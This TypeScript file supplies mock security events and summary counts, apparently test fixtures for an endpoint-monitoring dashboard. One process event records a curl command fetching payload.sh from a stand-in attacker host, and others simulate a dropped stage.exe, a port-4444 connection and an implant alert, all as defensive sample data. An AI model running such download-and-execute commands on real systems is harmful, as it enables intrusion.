const BASE_TIME = Date.parse('2025-02-15T10:00:00.000Z');

const toIso = (offsetMs: number) => new Date(BASE_TIME - offsetMs).toISOString();

export const mockSystemEvents = [
  {
    id: '11111111-1111-1111-1111-111111111111',
    agent_id: 'aaaaaaa1-0000-4000-8000-000000000001',
    agent_name: 'hk-edge-01',
    collector: 'collector-hk-edge',
    collector_kind: 'ebpf',
    event_type: 'process.exec',
    source: 'kernel.ebpf',
    priority: 'high',
    storage_tier: 'hot',
    timestamp: toIso(30 * 1000),
    sequence: 42001,
    payload: {
      pid: 4456,
      ppid: 1,
      image: '/usr/bin/curl',
      args: '-fsSL attacker.site/payload.sh',
    },
    metadata: {
      host_ip: '10.2.3.15',
      hostname: 'hk-edge-01',
    },
    tags: {
      os: 'linux',
    },
    received_at: toIso(25 * 1000),
  },
  {
    id: '22222222-2222-2222-2222-222222222222',
    agent_id: 'aaaaaaa2-0000-4000-8000-000000000002',
    agent_name: 'bj-core-02',
    collector: 'collector-bj-core',
    collector_kind: 'etw',
    event_type: 'sysmon.filecreate',
    source: 'etw.security',
    priority: 'normal',
    storage_tier: 'hot',
    timestamp: toIso(70 * 1000),
    sequence: 42002,
    payload: {
      file_path: 'C:\\Windows\\Temp\\stage.exe',
      process: 'powershell.exe',
    },
    metadata: {
      host_ip: '172.16.10.8',
      hostname: 'bj-core-02',
    },
    tags: {
      os: 'windows',
    },
    received_at: toIso(65 * 1000),
  },
  {
    id: '33333333-3333-3333-3333-333333333333',
    agent_id: 'aaaaaaa3-0000-4000-8000-000000000003',
    agent_name: 'sh-cache-01',
    collector: 'collector-sh-cache',
    collector_kind: 'ebpf',
    event_type: 'network.connect',
    source: 'kernel.ebpf',
    priority: 'high',
    storage_tier: 'hot',
    timestamp: toIso(120 * 1000),
    sequence: 42003,
    payload: {
      dst_ip: '45.76.23.5',
      dst_port: 4444,
      protocol: 'tcp',
    },
    metadata: {
      host_ip: '172.16.20.11',
      hostname: 'sh-cache-01',
    },
    tags: {
      os: 'linux',
    },
    received_at: toIso(115 * 1000),
  },
  {
    id: '44444444-4444-4444-4444-444444444444',
    agent_id: 'aaaaaaa4-0000-4000-8000-000000000004',
    agent_name: 'gz-terminal-01',
    collector: 'collector-gz-terminal',
    collector_kind: 'etw',
    event_type: 'security.logon',
    source: 'etw.security',
    priority: 'low',
    storage_tier: 'warm',
    timestamp: toIso(200 * 1000),
    sequence: 42004,
    payload: {
      account: 'svc-backup',
      provider: 'NTLM',
    },
    metadata: {
      host_ip: '192.168.23.9',
      hostname: 'gz-terminal-01',
    },
    tags: {
      os: 'windows',
    },
    received_at: toIso(195 * 1000),
  },
  {
    id: '55555555-5555-5555-5555-555555555555',
    agent_id: 'aaaaaaa5-0000-4000-8000-000000000005',
    agent_name: 'sz-edge-02',
    collector: 'collector-sz-edge',
    collector_kind: 'ebpf',
    event_type: 'file.unlink',
    source: 'kernel.ebpf',
    priority: 'normal',
    storage_tier: 'warm',
    timestamp: toIso(260 * 1000),
    sequence: 42005,
    payload: {
      path: '/tmp/.x',
      pid: 6042,
    },
    metadata: {
      host_ip: '10.8.0.14',
      hostname: 'sz-edge-02',
    },
    tags: {
      os: 'linux',
    },
    received_at: toIso(255 * 1000),
  },
  {
    id: '66666666-6666-6666-6666-666666666666',
    agent_id: 'aaaaaaa6-0000-4000-8000-000000000006',
    agent_name: 'cd-core-01',
    collector: 'collector-cd-core',
    collector_kind: 'detection-engine',
    event_type: 'detection.alert',
    source: 'detection-engine',
    priority: 'high',
    storage_tier: 'hot',
    timestamp: toIso(320 * 1000),
    sequence: 42006,
    payload: {
      rule: 'memory-implant',
      confidence: 0.92,
    },
    metadata: {
      host_ip: '172.16.30.5',
      hostname: 'cd-core-01',
    },
    tags: {
      os: 'linux',
    },
    received_at: toIso(315 * 1000),
  },
];

const aggregateBy = (key: 'event_type' | 'source') =>
  mockSystemEvents.reduce<Record<string, number>>((acc, event) => {
    const value = (event as Record<string, string | undefined>)[key];
    if (!value) {
      return acc;
    }
    acc[value] = (acc[value] ?? 0) + 1;
    return acc;
  }, {});

export const mockSystemEventStats = {
  total: mockSystemEvents.length,
  by_event_type: aggregateBy('event_type'),
  by_source: aggregateBy('source'),
};
